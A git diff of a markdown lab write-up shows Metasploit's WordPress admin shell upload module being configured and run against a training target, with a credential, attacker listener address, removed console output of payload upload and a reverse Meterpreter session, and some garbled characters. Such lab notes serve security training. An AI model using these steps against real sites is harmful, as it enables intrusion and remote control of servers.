@@ -81,23 +81,22 @@ msf5 exploit(unix/webapp/wp_admin_shell_upload) >
 
 ##### Module options (exploit/unix/webapp/wp_admin_shell_upload):
 
-Name       Current Setting  Required  Description
-----       ---------------  --------  -----------
-PASSWORD                    yes       The WordPress password to authenticate with
-Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-RPORT      80               yes       The target port (TCP)
-SSL        false            no        Negotiate SSL/TLS for outgoing connections
-TARGETURI  /                yes       The base path to the wordpress application
-USERNAME                    yes       The WordPress username to authenticate with
-VHOST                       no        HTTP server virtual host
+
+       PASSWORD                    yes       The WordPress password to authenticate with
+       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+       RPORT      80               yes       The target port (TCP)
+       SSL        false            no        Negotiate SSL/TLS for outgoing connections
+       TARGETURI  /                yes       The base path to the wordpress application
+       USERNAME                    yes       The WordPress username to authenticate with
+       VHOST                       no        HTTP server virtual host
 
 
 Exploit target:
 
-Id  Name
---  ----
-0   WordPress
+       Id  Name
+       --  ----
+       0   WordPress
     
 #### set and Exploitation
    
@@ -106,15 +105,6 @@ Id  Name
     msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
     msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
     msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
-
-[*] Started reverse TCP handler on 10.10.16.8z4444
-[*] Authenticating with WordPress using admin:Winter202@...
-[+] Authenticated with WordPress
-[*] Uploading payload...
-[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
-[*] Sending stage (38247 bytes) to blog.inlanefreight.com
-[*] Meterpreter session 1 opened
-[+] Deleted uTvAAKrAdp.php
 
 meterpreter > getuid
 Server username: www—data (33)
